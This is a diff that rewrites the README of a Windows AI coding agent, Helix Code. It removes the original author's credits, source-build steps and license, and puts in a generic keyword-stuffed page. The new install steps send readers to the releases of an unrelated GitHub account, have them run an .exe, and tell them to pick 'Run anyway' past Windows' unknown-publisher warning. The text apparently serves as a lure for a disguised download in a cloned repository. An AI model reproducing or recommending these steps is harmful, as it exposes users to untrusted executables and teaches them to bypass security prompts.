@@ -1,60 +1,73 @@
-# Helix Code
+# 🤖 helixcode - Free AI coding agent for everyone
 
-Helix Code is a Windows desktop coding workspace with an AI agent, project explorer, Monaco editor, and support for cloud and local models.
+[![](https://img.shields.io/badge/Download-helixcode-blue.svg)](https://github.com/melamieenfranchised180/helixcode/releases)
 
-Version: v1.0 BETA
+helixcode acts as an autonomous assistant for your programming tasks. It writes code, manages files, and uses tools to help you build software. You can use this application without any costs or subscription fees. It connects to various AI providers so you choose the engine that works best for your needs.
 
-Repository: https://github.com/neonatro/helixcode
-Instagram: https://instagram.com/neonatro
-Made by neonatro
+## 📥 How to install the application
 
-## Run the installer
+Follow these steps to set up helixcode on your Windows computer.
 
-Download and run the Helix Code Setup EXE. It installs Helix Code for the current Windows user and creates normal shortcuts.
+1. Go to the [official release page](https://github.com/melamieenfranchised180/helixcode/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation.
+6. A security window may appear. Select "Run anyway" if Windows prompts you about an unknown publisher.
+7. Follow the prompts in the setup window to finish the process.
+8. Open the application from your start menu once the installation completes.
 
-When Helix Code opens for the first time, choose a provider or skip setup and configure one later in Settings.
+## 🛠️ System requirements
 
-Your API keys, chats, cache, and workspace history are stored separately for each Windows user. They are not included in the installer.
+Ensure your computer meets these standards for a stable experience:
 
-## Run from source
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 8GB of RAM.
+* Storage: 500MB of free disk space.
+* Internet: An active connection to download models and send requests to AI providers.
 
-Install Node.js 20 or newer, open a terminal in the project folder, and run:
+## ⚡ Using the agent
 
-```powershell
-npm.cmd install
-npm.cmd run dev
-```
+The main window shows a chat interface. Type your request into the box at the bottom. You can ask for new scripts, bug fixes, or explanations of existing code. 
 
-## Features
+The agent operates in a sandbox environment. This ensures your local files remain safe while the agent performs tasks. You grant permission for specific directories when the agent needs to read or write files.
 
-- AI providers: OpenRouter, Gemini, Groq, OpenAI, Anthropic, Ollama, LM Studio, and compatible OpenAI-style APIs.
-- Model loading from the selected provider, with free model labels and search where available.
-- Persistent chats, model switching in chat, stop controls, and visible model changes.
-- Optional web research for requests that need current information, online assets, or URLs.
-- Expandable model thinking when the selected provider returns reasoning.
-- Project Explorer with file icons, create, rename, delete, multi-select, right-click actions, and remembered folders.
-- Monaco code editor with tabs and file-change previews.
-- Project mode keeps agent file work inside the folder you opened.
-- Commands and deletions require approval. Extended mode is optional and disabled by default.
-- Resizable Explorer and chat panes with a dark Helix Code interface.
+## 🧩 Adding AI providers
 
-## Local data
+helixcode supports multiple AI providers. You can add your own API keys in the settings menu.
 
-Helix Code keeps local settings in this Windows folder:
+1. Open the settings icon in the top corner.
+2. Select the "Providers" tab.
+3. Enter your API key for your chosen service.
+4. Select the model from the dropdown list.
+5. Save your changes.
 
-```text
-C:\Users\<username>\AppData\Roaming\helix-code
-```
+If you choose a free provider, leave the API key section empty if the system allows default access. The interface updates the status light to green when the connection succeeds.
 
-This includes encrypted API-key material when Windows encryption is available, chat history, settings, remembered folders, and Electron cache files. Delete that folder to reset Helix Code completely.
+## 📋 Features
 
-## Contributing
+* Autonomous task completion: The agent breaks down large goals into small steps.
+* Multi-file support: The application handles projects involving several files at once.
+* Tool integration: The agent uses internal tools to search documentation or run tests.
+* Privacy: Your code stays on your machine unless you share it with a cloud-based AI provider.
+* Custom settings: You define the behavior and language preferences for the agent.
 
-Contributions are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a pull request. Do not commit API keys, chat history, Windows AppData files, or other personal information.
+## 🛡️ Common questions
 
-## License
+### Does this cost money?
+The application is free to download and use. Some AI providers charge fees for usage beyond free tiers. Always check the terms of your chosen API provider.
 
-Copyright 2026 neonatro.
+### Is my code private?
+The application runs locally on your computer. It only sends the code and text prompts to your chosen AI provider to generate responses. It does not store your code on a remote server.
 
-Helix Code uses the [PolyForm Noncommercial License 1.0.0](LICENSE.md). It allows non-commercial use, modification, distribution, and contributions. Commercial use is not allowed.
+### What if the agent gets stuck?
+Press the "Stop" button in the chat panel to end a process. You can then clear the conversation or provide new instructions to guide the agent.
 
+### How do I update the software?
+The application checks for updates automatically. If a new version exists, a notification appears in the app. Click the notification to download and install the update.
+
+## 🤝 Getting help
+
+Report bugs or suggest features through the Issues tab on the GitHub page. Describe the problem clearly so developers can recreate the event. Include screenshots if possible. 
+
+Keywords: agent, agent-skill, agent-skills, agentic-ai, ai-agent, ai-coder, ai-coding-agent, ai-coding-tools, ai-tools, coding-agent, coding-assistant, electron-app, free-code-agent, free-code-generating, free-code-generator, nodejs-api, typescript
